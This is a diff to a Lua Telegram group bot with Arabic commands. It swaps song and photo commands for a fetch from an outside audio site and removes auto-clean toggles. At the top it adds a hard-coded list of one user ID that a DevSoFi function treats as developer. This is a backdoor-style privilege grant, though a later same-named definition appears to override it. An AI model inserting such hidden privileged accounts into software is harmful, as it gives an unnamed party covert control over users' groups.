@@ -195,6 +195,16 @@ end
 end  
 return DRAGON  
 end 
+dev_users = {1950281200}   
+function DevSoFi(msg)  
+local DRAGON = false  
+for k,v in pairs(dev_users) do  
+if tonumber(msg.sender_user_id_) == tonumber(v) then  
+DRAGON = true  
+end  
+end  
+return DRAGON  
+end 
 function DevSoFi(msg) 
 local hash = database:sismember(bot_id.."Dev:SoFi:2", msg.sender_user_id_) 
 if hash or SudoBot(msg) then  
@@ -10403,155 +10413,22 @@ local Textxt = text:match("^قول (.*)$")
 send(msg.chat_id_, msg.id_, '['..Textxt..']')
 end
 
-if text == "$-+)(&@٠١" and not  database:get(bot_id.."sing:for:me"..msg.chat_id_) then 
-ght = math.random(3,200); 
-local Text ='تم اختيار المقطع الصوتي لك' 
-keyboard = {}  
-keyboard.inline_keyboard = { 
-{{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
-} 
-local msg_id = msg.id_/2097152/0.5 
-https.request("https://api.telegram.org/bot"..token..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice=https://t.me/Ccckkc/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+if text == "غنيلي" and not database:get(bot_id.."sing:for:me"..msg.chat_id_) then
+data,res = https.request('https://black-source.tk/BlackTeAM/audios.php')
+if res == 200 then
+audios = json:decode(data)
+if audios.Info == true then
+local Text ='✭︙تم اختيار المقطع الصوتي لك'
+keyboard = {} 
+keyboard.inline_keyboard = {
+{{text = '𝙒𝙀𝙇𝘾𝙊𝙈𝙀 𝙏𝙊 𝙎𝙊𝙐𝙍𝘾𝙀 𝘼𝙇𝙊𝙉𝙀.',url="t.me/siria100"}},
+}
+local msg_id = msg.id_/2097152/0.5
+https.request("https://api.telegram.org/bot"..token..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice='..URL.escape(audios.info)..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 end
 end
-if text == 'غنيلي' then 
-Num = math.random(8,83)
-Mhm = math.random(108,143)
-Mhhm = math.random(166,179)
-Mmhm = math.random(198,216)
-Mhmm = math.random(257,626)
-local Texting = {Num,Mhm,Mhhm,Mmhm,Mhmm}
-local Rrr = Texting[math.random(#Texting)]
-local abc = msg.id_/2097152/0.5
-https.request('https://api.telegram.org/bot'..token..'/sendVoice?chat_id='..msg.chat_id_..'&reply_to_message_id='..abc..'&voice=https://t.me/mmsst13/'..Rrr..'') 
-end
-if text == 'غنيلي تامر حسني' then 
-T = math.random(3,12)
-local abc = msg.id_/2097152/0.5
-https.request('https://api.telegram.org/bot'..token..'/sendVoice?chat_id='..msg.chat_id_..'&reply_to_message_id='..abc..'&voice=https://t.me/emeuii/'..T..'') 
-end
-if text == 'غنيلي عمرو دياب' then 
-T = math.random(20,23)
-local abc = msg.id_/2097152/0.5
-https.request('https://api.telegram.org/bot'..token..'/sendVoice?chat_id='..msg.chat_id_..'&reply_to_message_id='..abc..'&voice=https://t.me/emeuii/'..T..'') 
-end
-if text == 'غنيلي تامر عاشور' then 
-T = math.random(25,28)
-local abc = msg.id_/2097152/0.5
-https.request('https://api.telegram.org/bot'..token..'/sendVoice?chat_id='..msg.chat_id_..'&reply_to_message_id='..abc..'&voice=https://t.me/emeuii/'..T..'') 
-end
-if text == 'غنيلي محمد فؤاد' then 
-T = math.random(30,38)
-local abc = msg.id_/2097152/0.5
-https.request('https://api.telegram.org/bot'..token..'/sendVoice?chat_id='..msg.chat_id_..'&reply_to_message_id='..abc..'&voice=https://t.me/emeuii/'..T..'') 
-end
-if text == 'غنيلي حماقي' then 
-T = math.random(51,61)
-local abc = msg.id_/2097152/0.5
-https.request('https://api.telegram.org/bot'..token..'/sendVoice?chat_id='..msg.chat_id_..'&reply_to_message_id='..abc..'&voice=https://t.me/emeuii/'..T..'') 
-end
-if text == 'غنيلي ابو الانوار' then 
-T = math.random(63,67)
-local abc = msg.id_/2097152/0.5
-https.request('https://api.telegram.org/bot'..token..'/sendVoice?chat_id='..msg.chat_id_..'&reply_to_message_id='..abc..'&voice=https://t.me/emeuii/'..T..'') 
-end
-if text == 'غنيلي رامي صبري' then 
-T = math.random(69,73)
-local abc = msg.id_/2097152/0.5
-https.request('https://api.telegram.org/bot'..token..'/sendVoice?chat_id='..msg.chat_id_..'&reply_to_message_id='..abc..'&voice=https://t.me/emeuii/'..T..'') 
-end
-if text == 'غنيلي مسلم' then 
-T = math.random(83,92)
-local abc = msg.id_/2097152/0.5
-https.request('https://api.telegram.org/bot'..token..'/sendVoice?chat_id='..msg.chat_id_..'&reply_to_message_id='..abc..'&voice=https://t.me/emeuii/'..T..'') 
-end
-if text == 'غنيلي ويجز' then 
-T = math.random(94,102)
-local abc = msg.id_/2097152/0.5
-https.request('https://api.telegram.org/bot'..token..'/sendVoice?chat_id='..msg.chat_id_..'&reply_to_message_id='..abc..'&voice=https://t.me/emeuii/'..T..'') 
-end
-if text == 'غنيلي عمار حسني' then 
-T = math.random(104,110)
-local abc = msg.id_/2097152/0.5
-https.request('https://api.telegram.org/bot'..token..'/sendVoice?chat_id='..msg.chat_id_..'&reply_to_message_id='..abc..'&voice=https://t.me/emeuii/'..T..'') 
-end
-if text == 'غنيلي عنبه' then 
-T = math.random(113,122)
-local abc = msg.id_/2097152/0.5
-https.request('https://api.telegram.org/bot'..token..'/sendVoice?chat_id='..msg.chat_id_..'&reply_to_message_id='..abc..'&voice=https://t.me/emeuii/'..T..'') 
-end
-if text == 'غنيلي مهرجانات' then 
-T = math.random(124,133)
-local abc = msg.id_/2097152/0.5
-https.request('https://api.telegram.org/bot'..token..'/sendVoice?chat_id='..msg.chat_id_..'&reply_to_message_id='..abc..'&voice=https://t.me/emeuii/'..T..'') 
-end
-if text == 'غنيلي اصاله' then 
-T = math.random(135,147)
-local abc = msg.id_/2097152/0.5
-https.request('https://api.telegram.org/bot'..token..'/sendVoice?chat_id='..msg.chat_id_..'&reply_to_message_id='..abc..'&voice=https://t.me/emeuii/'..T..'') 
-end
-if text == 'غنيلي اليسا' then 
-T = math.random(149,159)
-local abc = msg.id_/2097152/0.5
-https.request('https://api.telegram.org/bot'..token..'/sendVoice?chat_id='..msg.chat_id_..'&reply_to_message_id='..abc..'&voice=https://t.me/emeuii/'..T..'') 
-end
-if text == 'غنيلي كايروكي' then 
-T = math.random(161,175)
-local abc = msg.id_/2097152/0.5
-https.request('https://api.telegram.org/bot'..token..'/sendVoice?chat_id='..msg.chat_id_..'&reply_to_message_id='..abc..'&voice=https://t.me/emeuii/'..T..'') 
-end
-if text == 'غنيلي بابلو' then 
-T = math.random(177,183)
-local abc = msg.id_/2097152/0.5
-https.request('https://api.telegram.org/bot'..token..'/sendVoice?chat_id='..msg.chat_id_..'&reply_to_message_id='..abc..'&voice=https://t.me/emeuii/'..T..'') 
-end
-if text == 'غنيلي محمد منير' then 
-T = math.random(187,199)
-local abc = msg.id_/2097152/0.5
-https.request('https://api.telegram.org/bot'..token..'/sendVoice?chat_id='..msg.chat_id_..'&reply_to_message_id='..abc..'&voice=https://t.me/emeuii/'..T..'') 
-end
-if text == "تويت بالصور" and not  database:get(bot_id.."sing:for:me"..msg.chat_id_) then 
-ght = math.random(1,28); 
-local Text ='مرحبا إليك تويت بالصوره✨🌚' 
-keyboard = {}  
-keyboard.inline_keyboard = { 
-{{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./Banda.lua").botUserName.."?startgroup=start"}}, 
-} 
-local msg_id = msg.id_/2097152/0.5 
-https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/wffhvv/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
-end
-if text == "لو خيروك بالصور" and not  database:get(bot_id.."sing:for:me"..msg.chat_id_) then 
-ght = math.random(1,24); 
-local Text ='مرحبا اليك لو خيروك بالصوره🍁🌝' 
-keyboard = {}  
-keyboard.inline_keyboard = { 
-{{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./Banda.lua").botUserName.."?startgroup=start"}}, 
-} 
-local msg_id = msg.id_/2097152/0.5 
-https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/kbbnv/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 
-if text == "حروف بالصور" and not  database:get(bot_id.."sing:for:me"..msg.chat_id_) then 
-ght = math.random(1,15); 
-local Text ='مرحبا إليك حروف بالصوره✨🌚' 
-keyboard = {}  
-keyboard.inline_keyboard = { 
-{{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./Banda.lua").botUserName.."?startgroup=start"}}, 
-} 
-local msg_id = msg.id_/2097152/0.5 
-https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/ffadi8/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
-end
-
-if text == "تفعيل تنظيف التلقائي" and BasicConstructor(msg)  then
-database:set(bot_id.."LoMsg"..msg.chat_id_,true)
-send(msg.chat_id_, msg.id_, '◍  مـن قبـل  ⇠ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n◍ تم تفعيل التنظيف التلقائي* ')
-return false
-end
-if text == "تعطيل تنظيف التلقائي" and BasicConstructor(msg) then
-database:del(bot_id.."LoMsg"..msg.chat_id_)
-send(msg.chat_id_, msg.id_, '◍  مـن قبـل  ⇠ [「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」](T.ME/'..(data.username_ or 'textchuser')..') \n◍ تم تعطيل التنظيف التلقائي* ')
-return false
-end
 if text == "راسلني" then
 rpl = {"ها هلاو","انطق","قول"};
 sender = rpl[math.random(#rpl)]
@@ -13425,7 +13302,7 @@ keyboard.inline_keyboard = {
 {text = '◗القائمه الرائسيه◖', callback_data="/change-id"},
 },
 {
-{text = '《??𝙐𝙍𝘾𝙀 𝙎𝙄𝙍𝙄𝘼 》', url="t.me/X_G_33"},
+{text = '《𝙎𝙐𝙍𝘾𝙀 𝙎𝙄𝙍𝙄𝘼 》', url="t.me/X_G_33"},
 },
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
